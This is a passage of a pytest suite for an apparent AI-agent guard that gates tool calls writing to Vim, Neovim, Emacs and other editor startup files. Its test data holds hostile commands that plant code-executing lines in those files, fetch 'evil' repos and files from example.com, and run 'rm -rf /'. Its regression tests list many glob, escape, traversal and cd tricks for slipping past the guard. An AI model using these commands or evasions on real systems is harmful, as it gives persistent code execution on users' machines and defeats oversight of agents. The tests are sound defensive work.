"""Editor startup/init hijack guard: Vim/Neovim/Emacs/Kakoune/micro/Helix.

Each of these editors executes its user init files and runtime directories
(`~/.vimrc`, `~/.vim/plugin/`, `~/.config/nvim/init.lua`, `~/.emacs.d/init.el`,
...) as code on every launch -- and `git commit`/`git rebase -i` launch
`$EDITOR` -- so a planted line is durable code execution with the human's
privileges. The files are Turing-complete, so any write is gated (ask).
"""
import os

import pytest

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy
from aegis import patterns, rules

EMPTY = Policy()
DENY = Policy(editor_startup={"mode": "deny"})
RULE = "editor-startup-protect"


def _write(path, content="set number\n"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write",
                      args={"file_path": path, "content": content})


def _edit(path, new_string="set nu", old_string="x"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                      args={"file_path": path, "old_string": old_string,
                            "new_string": new_string})


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _mcp(args, tool="mcp__filesystem__write_file"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, action=ActionClass.MCP, args=args)


def _ours(d):
    return d.action == Action.ASK and d.rule == RULE


@pytest.fixture(autouse=True)
def _clean_env(monkeypatch):
    for k in ("AEGIS_ALLOW_EDITOR_STARTUP", "AEGIS_AGENT_NAME"):
        monkeypatch.delenv(k, raising=False)


GATED_PATHS = [
    "/home/u/.vimrc", "~/.vimrc", "C:\\Users\\John Smith\\_vimrc", "~/.gvimrc",
    "~/.exrc", "~/.ideavimrc", "~/.vim/plugin/evil.vim",
    "~/.vim/pack/x/start/y/plugin/z.vim", "~/.vim/after/ftplugin/python.vim",
    "~/vimfiles/vimrc", "~/.config/vim/vimrc", "/etc/vim/vimrc.local",
    "/etc/vimrc", "/usr/share/vim/vimfiles/plugin/a.vim",
    "~/.config/nvim/init.lua", "~/.config/nvim/init.vim",
    "~/.config/nvim/lua/plugins/x.lua", "~/.config/nvim/plugin/x.lua",
    "~/.local/share/nvim/site/pack/a/start/b/plugin/c.lua",
    "~/.local/share/nvim/lazy/foo/plugin/foo.lua",
    "C:\\Users\\u\\AppData\\Local\\nvim\\init.lua",
    "%LOCALAPPDATA%\\nvim-data\\site\\plugin\\x.lua",
    "$XDG_CONFIG_HOME/nvim/init.lua", "${XDG_CONFIG_HOME:-$HOME/.config}/nvim/init.lua",
    "/etc/xdg/nvim/sysinit.vim", "proj/.nvim.lua", "proj/.nvimrc",
    "~/.emacs", "~/.emacs.el", "~/.emacs.d/init.el", "~/.emacs.d/early-init.el",
    "~/.emacs.d/elpa/x/x-autoloads.el", "~/.config/emacs/init.el",
    "~/.doom.d/config.el", "~/.config/doom/init.el", "~/.spacemacs",
    "/usr/share/emacs/site-lisp/site-start.el",
    "/usr/share/emacs/site-lisp/default.el", "/etc/emacs/site-start.d/50x.el",
    "proj/.dir-locals.el", "~/.config/kak/kakrc", "~/.config/kak/autoload/x.kak",
    "~/.config/micro/init.lua", "~/.config/helix/languages.toml",
    "proj/.helix/languages.toml", "~/.vimrc::$DATA", "~/.vimrc.",
]

UNGATED_PATHS = [
    "src/syntax/foo.vim", "dotfiles/vimrc", "~/.vimrc.bak", "~/.viminfo2",
    "README.md", "my.emacs.d/x", "docs/vim.md",
    "~/.helixrc", "app/emacs_mode.py", "~/.config/nvimx/init.lua",
    "src/default.el", "~/.config/vimx",
]


@pytest.mark.parametrize("path", GATED_PATHS)
def test_paths_recognized(path):
    assert patterns.EDITOR_STARTUP_PATH_RE.search(path), path


@pytest.mark.parametrize("path", UNGATED_PATHS)
def test_unrelated_paths_not_recognized(path):
    assert not patterns.EDITOR_STARTUP_PATH_RE.search(path), path


@pytest.mark.parametrize("path", GATED_PATHS)
def test_write_gated(path):
    assert _ours(evaluate(_write(path, "autocmd VimEnter * silent !id\n"), EMPTY))


@pytest.mark.parametrize("path", ["~/.vimrc", "~/.config/nvim/init.lua", "~/.emacs.d/init.el"])
def test_edit_gated_even_benign(path):
    # Turing-complete files: no benign subset, any write asks.
    assert _ours(evaluate(_edit(path), EMPTY))


def test_multiedit_gated():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
                    args={"file_path": "~/.vimrc",
                          "edits": [{"old_string": "a", "new_string": "b"}]})
    assert _ours(evaluate(ev, EMPTY))


@pytest.mark.parametrize("path", UNGATED_PATHS)
def test_unrelated_write_allowed(path):
    d = evaluate(_write(path), EMPTY)
    assert d.rule != RULE


def test_deny_mode():
    d = evaluate(_write("~/.vimrc"), DENY)
    assert d.action == Action.DENY and d.rule == RULE


def test_off_mode():
    assert evaluate(_write("~/.vimrc"), Policy(editor_startup={"mode": "off"})).rule != RULE


def test_monitor_mode_allows():
    d = evaluate(_write("~/.vimrc"), Policy(editor_startup={"mode": "monitor"}))
    assert d.rule != RULE


def test_policy_allow_regex():
    pol = Policy(editor_startup={"allow": [r"dotfiles/"]})
    assert evaluate(_write("/home/u/dotfiles/.vimrc"), pol).rule != RULE
    assert _ours(evaluate(_write("/home/u/.vimrc"), pol))


def test_policy_allow_bare_string():
    pol = Policy(editor_startup={"allow": r"dotfiles/"})
    assert evaluate(_write("/home/u/dotfiles/.vimrc"), pol).rule != RULE


def test_env_escape(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_EDITOR_STARTUP", "1")
    assert evaluate(_write("~/.vimrc"), EMPTY).rule != RULE
    assert evaluate(_shell("echo 'set nu' >> ~/.vimrc"), EMPTY).rule != RULE


@pytest.mark.parametrize("cmd", [
    "echo 'autocmd VimEnter * silent !id' >> ~/.vimrc",
    "printf 'os.execute(\"id\")' > ~/.config/nvim/init.lua",
    "cat >~/.vimrc<<EOF\n!id\nEOF",
    "tee -a ~/.emacs.d/init.el < payload",
    "cp /tmp/x.vim ~/.vim/plugin/",
    "mkdir -p ~/.config/nvim/plugin && cp x.lua ~/.config/nvim/plugin/",
    "ln -sf /tmp/evil.lua ~/.config/nvim/init.lua",
    "rsync -a payload/ ~/.config/nvim/",
    "tar xf p.tgz -C ~/.vim",
    "unzip -o p.zip -d ~/.emacs.d",
    "git clone https://example.com/evil ~/.vim/pack/x/start/evil",
    "sed -i '$a silent !id' ~/.vimrc",
    "mv /tmp/x ~/.exrc",
    "echo x >> ~/.vim{rc,}",
    "echo x >> ~/.vi\\mrc",
    "cp x ~/.config/nv*/init.lua",
    "cp x ~/.config/*/init.lua",
    "cp x ~/.e?acs.d/init.el",
    "cp x ~/_vimr?",
    "bash -c 'echo !id >> ~/.vimrc'",
    "cd /tmp; echo x >> \"$HOME/.vimrc\"",
    "python3 -c \"open('/home/u/.vimrc','a').write('x')\"",
    "vim -es -c 'normal Gosilent !id' -c wq ~/.vimrc",
    "echo x >> /etc/vim/vimrc.local",
    "echo x >> .nvim.lua",
    "echo '((nil . ((eval . (shell-command \"id\")))))' > .dir-locals.el",
])
def test_shell_write_gated(cmd):
    assert _ours(evaluate(_shell(cmd), EMPTY)), cmd


@pytest.mark.parametrize("cmd", [
    "cat ~/.vimrc",
    "grep -n autocmd ~/.vimrc",
    "ls -la ~/.config/nvim",
    "ls ~/.vim/plugin 2>/dev/null",
    "head -20 ~/.emacs.d/init.el",
    "test -f ~/.vimrc && echo yes",
    "rm ~/.config/nvim/plugin/evil.lua",
    "wc -l ~/.vimrc",
    "cp build/* dist/",
    "cp -r src/*/* out/",
    "echo hello > out.txt",
    "vim --version",
    "git commit -m 'fix'",
    "ls ~/.*",
])
def test_shell_non_write_allowed(cmd):
    assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd


def test_shell_override_human_only(monkeypatch):
    cmd = "echo 'set nu' >> ~/.vimrc # aegis-allow"
    assert evaluate(_shell(cmd), EMPTY).rule != RULE
    monkeypatch.setenv("AEGIS_AGENT_NAME", "worker")
    assert evaluate(_shell(cmd), EMPTY).rule == RULE


def test_shell_deny_mode():
    d = evaluate(_shell("echo x >> ~/.vimrc"), DENY)
    assert d.action == Action.DENY and d.rule == RULE


def test_shell_policy_allow():
    pol = Policy(editor_startup={"allow": [r"^/home/[^/]+/dotfiles/"]})
    assert evaluate(_shell("cp x /home/u/dotfiles/.vimrc"), pol).rule != RULE


# ---- MCP ------------------------------------------------------------------

def test_mcp_write_gated():
    assert _ours(evaluate(_mcp({"path": "~/.vimrc", "content": "set nu"}), EMPTY))


def test_mcp_unusual_key_gated():
    assert _ours(evaluate(_mcp({"destination_file": "/home/u/.config/nvim/init.lua",
                                "data": "x"}, tool="mcp__fs__save"), EMPTY))


def test_mcp_nested_key_gated():
    assert _ours(evaluate(_mcp({"spec": {"target": "~/.emacs.d/init.el"}, "body": "x"},
                               tool="mcp__fs__put"), EMPTY))


def test_mcp_create_directory_gated():
    assert _ours(evaluate(_mcp({"path": "~/.vim/plugin"},
                               tool="mcp__filesystem__create_directory"), EMPTY))


def test_mcp_move_into_gated():
    assert _ours(evaluate(_mcp({"source": "/tmp/x.lua",
                                "destination": "~/.config/nvim/plugin/x.lua"},
                               tool="mcp__filesystem__move_file"), EMPTY))


def test_mcp_patch_gated():
    patch = "*** Begin Patch\n*** Add File: /home/u/.vimrc\n+silent !id\n*** End Patch\n"
    assert _ours(evaluate(_mcp({"input": patch}, tool="mcp__codex__apply_patch"), EMPTY))


def test_mcp_mapping_key_gated():
    assert _ours(evaluate(_mcp({"files": {"/home/u/.vimrc": "silent !id"}},
                               tool="mcp__fs__write_many"), EMPTY))


def test_mcp_shell_tool_gated():
    assert _ours(evaluate(_mcp({"command": "echo x >> ~/.vimrc"},
                               tool="mcp__desktop__start_process"), EMPTY))


def test_mcp_read_allowed():
    for tool in ("mcp__filesystem__read_file", "mcp__filesystem__list_directory",
                 "mcp__filesystem__get_file_info"):
        assert evaluate(_mcp({"path": "~/.vimrc", "encoding": "utf-8"}, tool=tool),
                        EMPTY).rule != RULE, tool


def test_mcp_read_with_output_gated():
    assert _ours(evaluate(_mcp({"path": "/tmp/x", "output": "~/.vimrc"},
                               tool="mcp__http__get"), EMPTY))


def test_mcp_delete_allowed():
    assert evaluate(_mcp({"path": "~/.vim/plugin/evil.vim"},
                         tool="mcp__filesystem__delete_file"), EMPTY).rule != RULE


def test_mcp_prose_mention_allowed():
    ev = _mcp({"channel": "C1", "text": "check ~/.vimrc for the autocmd"},
              tool="mcp__slack__post_message")
    assert evaluate(ev, EMPTY).rule != RULE


def test_mcp_unrelated_write_allowed():
    assert evaluate(_mcp({"path": "/repo/src/app.py", "content": "x"}), EMPTY).rule != RULE


# ---- wiring -----------------------------------------------------------------

def test_registered_in_builtin_rules():
    assert rules.rule_editor_startup_protect in rules.BUILTIN_RULES


def test_fetch_to_file_backstop_registered():
    d = evaluate(_shell("curl -o ~/.vimrc https://example.com/x"), EMPTY)
    assert d.action != Action.ALLOW


def test_hard_deny_not_preempted():
    # A later hard-DENY on the same command must still win over our ASK.
    d = evaluate(_shell("echo x >> ~/.vimrc; rm -rf /"), EMPTY)
    assert d.action == Action.DENY


def test_loader_reads_policy_key(tmp_path):
    from aegis.loader import load_policy
    f = tmp_path / "p.yaml"
    f.write_text("editor_startup:\n  mode: deny\n")
    assert load_policy(str(f)).editor_startup == {"mode": "deny"}


# ---- QA round 1 regressions ---------------------------------------------------

@pytest.mark.parametrize("path", [
    "/home/u/.config/x/../nvim/init.lua",
    "/home/u/.local/share/x/../nvim/site/plugin/a.lua",
    "C:\\Users\\u\\AppData\\Local\\x\\..\\nvim\\init.lua",
    "C:\\Program Files\\Vim\\vimrc", "C:\\Program Files\\Vim\\vim91\\plugin\\x.vim",
    "/Applications/MacVim.app/Contents/Resources/vim/vimrc",
    "/usr/share/emacs/site-lisp/subdirs.el", "/usr/local/share/emacs/30.1/site-lisp/x.el",
    "/usr/share/emacs/30.1/lisp/subdirs.el", "/usr/lib/emacs/30.1/native-lisp/x/y.eln",
    "/usr/share/kak/kakrc", "/usr/local/share/kak/autoload/x.kak",
    "/usr/lib/helix/runtime/grammars/python.so",
    "~/.var/app/io.neovim.nvim/config/nvim/init.lua",
    "~/.var/app/io.neovim.nvim/data/nvim/site/plugin/a.lua",
    "~/.cache/nvim/luac/%init.luac",
    "file:///home/u/%2Evimrc",
])
def test_r1_paths_gated(path):
    assert _ours(evaluate(_write(path), EMPTY)), path


@pytest.mark.parametrize("cmd", [
    "cp /tmp/e ~/.config/foo/../nvim/init.lua",
    "echo x >> ~/.config/x/../nvim/init.lua",
    "cp /tmp/e ~/.vim[^x]c",
    "cp /tmp/e ~/.vim[[:lower:]]c",
    "cp /tmp/e ~/.config/nvi[[:alpha:]]/init.lua",
    "cp /tmp/e ~/.vi{l..m}rc",
    "cp /tmp/e ~/.config/{m..n}vim/init.lua",
    "cp /tmp/e ~/.local/*/nvim/site/plugin/x.lua",
    "cp /tmp/e /*/vim/vimrc.local",
    "cp /tmp/e /*/xdg/nvim/sysinit.vim",
    "cp /tmp/e ~/*/*/nvim/init.lua",
    "LESSOPEN=$'cp\\x20/tmp/e\\x20%s' less ~/.vimrc",
    "RIPGREP_CONFIG_PATH=/tmp/rgc rg . ~/.vimrc",
    "cp /tmp/e ~/.vimrc(N)",
    "cp /tmp/e ~/.vimr(c)",
    "cp /tmp/e ~/.config/(nvim)/init.lua",
    "tar xzf e.tgz -C ~",
    "unzip e.zip -d ~",
    "cp -r /tmp/dotfiles/. ~/",
    "rsync -a d/ ~/",
    "stow -t ~ evil",
    "tar xf e.tgz -C $HOME/.config",
    "cd ~/.config && cp x nvim/init.lua",
    "cd ~ && echo x >> .vimrc",
])
def test_r1_shell_gated(cmd):
    assert _ours(evaluate(_shell(cmd), EMPTY)), cmd


@pytest.mark.parametrize("args,tool", [
    ({"source": "/tmp/e", "destination": "/home/u/.config/nvim/plugin/a b.lua"},
     "mcp__fs__move_file"),
    ({"source": "/tmp/e", "destination": "~/.vim/plugin/x y.vim"}, "mcp__fs__copy_file"),
    ({"files": {"/home/u/.config/nvim/a b.lua": "x"}}, "mcp__fs__write_many"),
    ({"destination": "home/u/.vimrc"}, "mcp__fs__move_file"),
    ({"destination": "Documents/../.vimrc"}, "mcp__fs__move_file"),
    ({"dest": "/home/u/.config/x/../nvim/init.lua"}, "mcp__fs__move_file"),
    ({"input": "*** Begin Patch\n*** Add File: /home/u/.config/x/../nvim/init.lua\n+x\n*** End Patch\n"},
     "mcp__codex__apply_patch"),
    ({"command": ["cp", "/tmp/e", "/home/u/.config/x/../nvim/init.lua"]},
     "mcp__desktop__start_process"),
    ({"file_path": "~/.vimrc", "contents": "x"}, "mcp__fs__open"),
    ({"path": "~/.vimrc", "content": "x"}, "mcp__fs__open_file"),
    ({"path": "~/.vimrc", "data": "x"}, "mcp__ide__open_in_editor"),
    ({"path": "~/.vimrc", "content": "x"}, "mcp__fs__unlink_dump"),
    ({"path": "~/.vimrc", "content": "x"}, "mcp__fs__remove_emit"),
    ({"path": "~/.vimrc", "content": "x"}, "mcp__fs__delete_then_recreate"),
    ({"uri": "file:///home/u/%2Evimrc", "text": "x"}, "mcp__fs__write"),
])
def test_r1_mcp_gated(args, tool):
    assert _ours(evaluate(_mcp(args, tool=tool), EMPTY)), (tool, args)


@pytest.mark.parametrize("cmd", [
    "ls ~/.vim | sort",
    "wc -l ~/.vimrc | sort -n",
    "git log -- .vimrc",
    "git diff ~/.config/nvim/init.lua",
    "cd ~/.config/nvim && git status",
    "cd ~ && tar czf /tmp/backup.tgz proj",
    "ls ~",
])
def test_r1_false_positives_fixed(cmd):
    assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd


@pytest.mark.parametrize("cmd", [
    "ls ~/.vim | sort -o ~/.vimrc",
    "git diff --output=~/.vimrc",
    "git -c core.pager=x log -- .vimrc > ~/.vimrc",
    "sort --compress-program=sh ~/.vimrc",
])
def test_r1_read_verb_abuse_still_gated(cmd):
    assert _ours(evaluate(_shell(cmd), EMPTY)), cmd


def test_r1_glob_perf_bounded():
    import time
    cmd = "cp x " + " ".join(["q/[a-d]*/[a-d]*/[a-d]*/[a-d]*/q"] * 600)
    t = time.time()
    evaluate(_shell(cmd), EMPTY)
    assert time.time() - t < 3.0


@pytest.mark.parametrize("cmd", [
    "echo '* text=auto' >> .gitattributes",
    "echo '*.log' >> .gitignore",
    "cp * /tmp/out/",
])
def test_r1_bare_star_not_a_hit(cmd):
    assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd


# ---- QA round 2 regressions ---------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "cp *.el dist/", "git add lisp/*.el", "emacs --batch -f batch-byte-compile *.el",
    "cp *.d out/", "cp -r config/* build/", "cp local/* x/", "rsync -a share/* /out/",
    "zip -r out.zip etc/*", "sed -i 's/.*/X/' f.txt", "perl -pi -e 's/.*//' a.txt",
    "sed -i 's|/.*/|/|' f", "mkdir -p build/share/vim",
    "prettier --write 'src/**/*.ts'", "eslint 'src/**/*.{js,ts}'",
    "cp src/.* /tmp/out/",
])
def test_r2_shell_false_positives_fixed(cmd):
    assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd


@pytest.mark.parametrize("path", [
    "/repo/app/vim/vimrc", "docs/etc/vim/notes.md", "/repo/src/share/nvim/x.ts",
    "/repo/etc/emacs/x", "/repo/lisp/site-start.el", "/repo/site-lisp/x.el",
    "/repo/vim91/x",
])
def test_r2_write_false_positives_fixed(path):
    assert evaluate(_write(path), EMPTY).rule != RULE, path


@pytest.mark.parametrize("path", [
    "/etc/vim/vimrc", "/private/etc/vimrc", "C:/Program Files/Git/etc/vimrc",
    "/usr/share/vim/vimfiles/plugin/a.vim", "/usr/local/share/nvim/site/plugin/a.lua",
    "/opt/homebrew/share/vim/vimrc", "/nix/store/" + "a" * 32 + "-vim-9.1/share/vim/vimrc",
    "C:\\Program Files\\Emacs\\emacs-29.1\\share\\emacs\\site-lisp\\site-start.el",
    "C:\\Program Files (x86)\\Vim\\vim91\\defaults.vim",
    "//etc/vim/vimrc", "/usr/share/emacs/site-lisp/default.el",
])
def test_r2_anchored_system_paths_still_gated(path):
    assert _ours(evaluate(_write(path), EMPTY)), path


@pytest.mark.parametrize("cmd", [
    "cp x /*/vim/vimrc.local", "cp x ~/.config/*/init.lua", "cp x /home/u/.vi?rc",
    "cp x ~/.?im/plugin/a.vim", "cp x \"$HOME\"/.vim{rc,}",
])
def test_r2_real_globs_still_gated(cmd):
    assert _ours(evaluate(_shell(cmd), EMPTY)), cmd


@pytest.mark.parametrize("args,tool", [
    ({"path": "/repo/x.txt", "content": "a\n+++ b/.vimrc\n"}, "mcp__fs__write_file"),
    ({"path": "/repo/notes.md", "content": "~/.vimrc"}, "mcp__fs__write_file"),
    ({"to": "a@b", "body": "I updated my ~/.vimrc today"}, "mcp__gmail__send_email"),
    ({"text": "see .emacs.d/init.el for config"}, "mcp__slack__send_message"),
    ({"inputs": {"note": "helix/.helix ok"}}, "mcp__github__actions_run_trigger"),
])
def test_r2_mcp_false_positives_fixed(args, tool):
    assert evaluate(_mcp(args, tool=tool), EMPTY).rule != RULE, tool


@pytest.mark.parametrize("args,tool", [
    ({"path": "~/.vimrc", "content": "x"}, "mcp__fs__delete_and_set"),
    ({"path": "~/.vimrc", "content": "x"}, "mcp__fs__remove_and_rewrite"),
    ({"path": "~/.config/nvim/init.lua", "data": "x"}, "mcp__fs__rm_dump"),
    ({"path": "~/.vimrc", "text": "\" "}, "mcp__fs__delete_text"),
    ({"path": "~/.vimrc", "start": 1, "end": 3}, "mcp__fs__delete_lines"),
    ({"path": "~/.vimrc"}, "mcp__fs__remove_comment"),
    ({"path": "~/.vimrc", "content": "x"}, "mcp__fs__open_file"),
    ({"command": "echo x >> ~/.vimrc"}, "mcp__ci__run"),
    ({"input": "echo x >> ~/.vimrc"}, "mcp__term__interact_with_process"),
])
def test_r2_mcp_still_gated(args, tool):
    assert _ours(evaluate(_mcp(args, tool=tool), EMPTY)), tool


def test_r2_allow_regex_normalized():
    pol = Policy(editor_startup={"allow": ["/dotfiles/"]})
    assert _ours(evaluate(_write("/home/u/dotfiles/../.vimrc"), pol))
    assert _ours(evaluate(_shell("echo 'source /tmp/p.vim' >> ~/.vimrc # /dotfiles/"), pol))
    assert _ours(evaluate(_shell("cp /home/u/dotfiles/x ~/.vimrc"), pol))
    assert evaluate(_shell("cp x /home/u/dotfiles/.vimrc"), pol).rule != RULE


def test_r2_non_dict_args_do_not_crash():
    ev = _mcp({"path": "x"}, tool="mcp__fs__write")
    ev.args = "~/.vimrc"
    assert _ours(rules.rule_editor_startup_protect(ev, EMPTY))


def test_r2_glob_bomb_bounded():
    import time
    word = "{a,b,c,d,e,f}{a,b,c,d,e,f}{a,b}/" + "/".join(["x*"] * 20)
    cmd = "true " + " ".join([word] * 3900) + "; cp /tmp/p ~/.v?mrc"
    t = time.time()
    d = evaluate(_shell(cmd), EMPTY)
    assert time.time() - t < 10.0 and d.action != Action.ALLOW


# ---- QA round 3 regressions ---------------------------------------------------

@pytest.mark.parametrize("path", [
    "/home/u/.config/git/./../nvim/init.lua",
    "/home/u/.local/share/x/./../nvim/site/plugin/x.lua",
    "/usr/share/x/./../vim/vimrc", "/etc/x/./../vim/vimrc.local",
    "/home/u/.config/x/.//../nvim/init.lua",
    "/./etc/vim/vimrc.local", "/../etc/vimrc",
    "/proc/self/root/etc/vimrc", "C:/msys64/etc/vimrc", "/c/msys64/etc/vimrc",
    "/opt/homebrew/opt/neovim/share/nvim/runtime/plugin/x.lua",
    "/usr/local/Cellar/neovim/0.10/share/nvim/runtime/plugin/a.lua",
    "/opt/homebrew/Cellar/emacs-plus@29/29.1/share/emacs/site-lisp/default.el",
    "/usr/local/opt/vim/share/vim/vim91/plugin/x.vim",
    "/home/u/.local/share/bob/v0.10.0/share/nvim/runtime/plugin/x.lua",
    "/home/u/.asdf/installs/neovim/0.10.0/share/nvim/runtime/plugin/x.lua",
    "/home/u/nvim-linux-x86_64/share/nvim/runtime/plugin/x.lua",
    "/opt/nvim-linux64/share/nvim/runtime/lua/vim/_init.lua",
    "/Applications/Emacs.app/Contents/Resources/site-lisp/default.el",
    "/Applications/Emacs.app/Contents/Resources/lisp/subdirs.el",
    "C:\\PROGRA~1\\Vim\\vim91\\plugin\\x.vim",
    "C:\\Users\\u\\AppData\\Roaming\\EMACS~1.D\\init.el",
])
def test_r3_paths_gated(path):
    assert _ours(evaluate(_write(path), EMPTY)), path
    assert _ours(evaluate(_shell(f"echo x > '{path}'"), EMPTY)), path


@pytest.mark.parametrize("cmd", [
    "echo x > ~/../../etc/vim/vimrc.local", "echo x > $HOME/../../etc/vimrc",
    "echo x > /proc/1/root/etc/vim/vimrc.local",
    "mv nvim ~/.config/", "mkdir -p /tmp/p/nvim && mv /tmp/p/nvim ~/.config",
    "ln -s $PWD/nvim ~/.config/", "ln -sfn /tmp/evil ~/.config/nvim",
    "cp -t ~/.config -r nvim", "mv /tmp/p/* ~/.config/",
    "git -C ~/.config clone https://x/nvim",
])
def test_r3_shell_gated(cmd):
    assert _ours(evaluate(_shell(cmd), EMPTY)), cmd


C3 = "echo 'au VimEnter * !id' >> ~/.vimrc"


@pytest.mark.parametrize("tool,args", [
    ("mcp__tmux__send_keys", {"paneId": "%1", "keys": C3}),
    ("mcp__tmux__send_keys", {"paneId": "%1", "text": C3}),
    ("mcp__x__run_command", {"commandline": C3}),
    ("mcp__x__run_command", {"cmdline": C3}),
    ("mcp__x__run_command", {"line": C3}),
    ("mcp__x__RunCommand", {"CommandLine": C3}),
    ("mcp__x__run", {"argv": ["bash", "-c", C3]}),
    ("mcp__x__run_program", {"program": "bash", "arguments": ["-c", C3]}),
    ("mcp__x__launch", {"executable": "bash", "args": ["-c", C3]}),
    ("mcp__ssh__ssh_run", {"line": C3}),
    ("mcp__remote__run_remote", {"input": C3}),
])
def test_r3_mcp_shell_runners_gated(tool, args):
    assert _ours(evaluate(_mcp(args, tool=tool), EMPTY)), tool


def test_r3_mcp_messaging_still_not_shell():
    for tool, args in [("mcp__gmail__send_email", {"body": "I updated ~/.vimrc"}),
                       ("mcp__slack__send_message", {"text": "see .emacs.d/init.el"}),
                       ("mcp__github__actions_run_trigger", {"inputs": {"n": ".helix ok"}})]:
        assert evaluate(_mcp(args, tool=tool), EMPTY).rule != RULE, tool


@pytest.mark.parametrize("cmd", [
    "cp x ~/dotfiles/.vimrc; cp x ~/.vi?rc",
    "cp x ~/dotfiles/.vimrc; cp x ~/.vi\"m\"rc",
    "cp x ~/dotfiles/.vimrc; cp x ~/.vi''mrc",
    "cp x ~/dotfiles/.vimrc; cp x ~/.vi{m,}rc",
    "cp x ~/dotfiles/.vimrc; cp x ~/.config/(nvim)/init.lua",
    "cp x ~/dotfiles/.vimrc; cd ~/.config && cp x nvim/init.lua",
])
def test_r3_shell_allow_not_bypassable(cmd):
    pol = Policy(editor_startup={"allow": ["/dotfiles/"]})
    assert _ours(evaluate(_shell(cmd), pol)), cmd


def test_r3_allow_dot_and_urlencoded_bypass():
    pol = Policy(editor_startup={"allow": ["/dotfiles/"]})
    assert _ours(evaluate(_write("/home/u/dotfiles/./../.vimrc"), pol))
    assert _ours(evaluate(_write("file:///home/u/dotfiles/%2e%2e/.vimrc"), pol))


def test_r3_allow_bad_type_no_crash():
    pol = Policy(editor_startup={"allow": 5})
    assert _ours(rules.rule_editor_startup_protect(_write("~/.vimrc"), pol))


@pytest.mark.parametrize("cmd", [
    "cp apps/*/config/default.json dist/", "cat packages/*/data/*.json > merged.json",
    "tar czf out.tgz services/*/config", "jq . src/*/app/manifest.json > out.json",
    "cp -r modules/*/local/x dist/", "cp ~/work/*/config/app.yml /tmp/",
    "echo x > debian/tmp/usr/share/vim/addons/x.vim", "touch ./usr/share/vim/x",
    "cd ~ && mv a b", "mv a.txt b.txt", "ln -s ../lib/x.py x.py",
])
def test_r3_false_positives_fixed(cmd):
    assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd


def test_r3_cwd_relative_writes_gated():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="Write", cwd="/home/u/.config/nvim",
                    args={"file_path": "init.lua", "content": "x"})
    assert _ours(evaluate(ev, EMPTY))
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", cwd="/home/u/.vim",
                    args={"command": "echo x > plugin/x.vim"})
    assert _ours(evaluate(ev, EMPTY))


@pytest.mark.parametrize("ev", [
    _shell("%2E" * 126000), _write("%2E" * 126000), _shell("echo " + "." * 20000),
    _write("/tmp/" + "a" * 20000 + ".."), _mcp({"path": "a" * 20000 + ".."}),
])
def test_r3_perf_bounded(ev):
    import time
    t = time.time()
    evaluate(ev, EMPTY)
    assert time.time() - t < 5.0


# ---- QA round 4 regressions ---------------------------------------------------

def _sh_cwd(cmd, cwd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", cwd=cwd, args={"command": cmd})


@pytest.mark.parametrize("cmd", [
    # placement into system dirs
    "sudo cp /tmp/vimrc /etc/", "sudo cp -t /etc /tmp/vimrc", "sudo mv /tmp/vimrc /etc/",
    "sudo ln -s /tmp/vim /etc/", "sudo cp -r /tmp/nvim /etc/xdg/",
    "sudo cp -r /tmp/vim /usr/share/", "sudo cp -r /tmp/emacs /etc/",
    "rsync /tmp/vimrc /etc/", "sudo install -m644 vimrc /etc/",
    # glued short options
    "sort -o/etc/vimrc x", "curl -sSo/etc/vimrc https://x/y", "wget -qO/etc/vimrc https://x/y",
    "cp -t/etc/vim x", "cp x -T/etc/vimrc", "patch -o/etc/vimrc a b",
    "sort -o/etc/xdg/nvim/sysinit.vim x", "tar -C/etc -xf v.tar",
    # cd + glob / cd options
    "cd ~/.config && cp x n?im/init.lua", "cd ~/.config; cp x */init.lua",
    "cd ~/.config && cp x {nvim,y}/init.lua", "cd ~/.config/x && echo x > ../n?im/init.lua",
    "cd -- ~/.config && cp x nvim/init.lua", "cd -P ~/.config && cp x nvim/init.lua",
    # zsh groups past the prefilter
    "echo x >> ~/.(e)macs", "echo x >> ~/.(e)macs.d/init.el", "echo x >> ~/.(v)(i)(m)rc",
    "echo x >> ~/.config/n(v)im/init.lua",
    # bulk via cd / . / trailing options
    "cd ~/.config && mv /tmp/nvim .", "cd ~/.config && cp -r /tmp/nvim .",
    "cd ~/.config && ln -s ~/dotfiles/nvim", "cd ~/.config && git clone https://x/nvim",
    "cd ~ && cp -r /tmp/dots/. .", "cd ~; tar xf /tmp/d.tgz",
    "mv /tmp/nvim ~/.config/.", "mv /tmp/nvim ~/./.config", "mv /tmp/nvim ~/.config/x/..",
    "cp /tmp/nvim -r ~/.config", "cp /tmp/dots/. -a ~",
    # ANSI-C unicode escapes, git exec env
    "echo x > ~/.$'\\U00000076'imrc", "echo x > ~/.$'\\u0076'imrc",
    "GIT_EXTERNAL_DIFF=/tmp/x.sh git diff ~/.vimrc",
    "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=diff.external GIT_CONFIG_VALUE_0=/tmp/e git diff ~/.vimrc",
    # new locations
    "echo x > ~/.SpaceVim.d/init.toml", "echo x > ~/.vim_runtime/vimrcs/basic.vim",
    "echo x > ~/.emacs-profiles.el",
])
def test_r4_shell_gated(cmd):
    assert _ours(evaluate(_shell(cmd), EMPTY)), cmd


def test_r4_cwd_glob_gated():
    assert _ours(evaluate(_sh_cwd("cp x n?im/init.lua", "/home/u/.config"), EMPTY))


@pytest.mark.parametrize("cmd", [
    "mv report.pdf ~", "mv ~/Downloads/x.tar.gz ~/", "mv node_modules ~/",
    "ln -s ~/code/proj ~", "ln -s ~/dotfiles/zshrc ~/", "mv ./a.txt ~/.config/",
    "mv ~/foo ~/.local/share/", "cp build/* dist/", "mv a b", "cp -r src dist",
    "tar xf a.tgz -C /tmp/out", "git clone https://github.com/x/y",
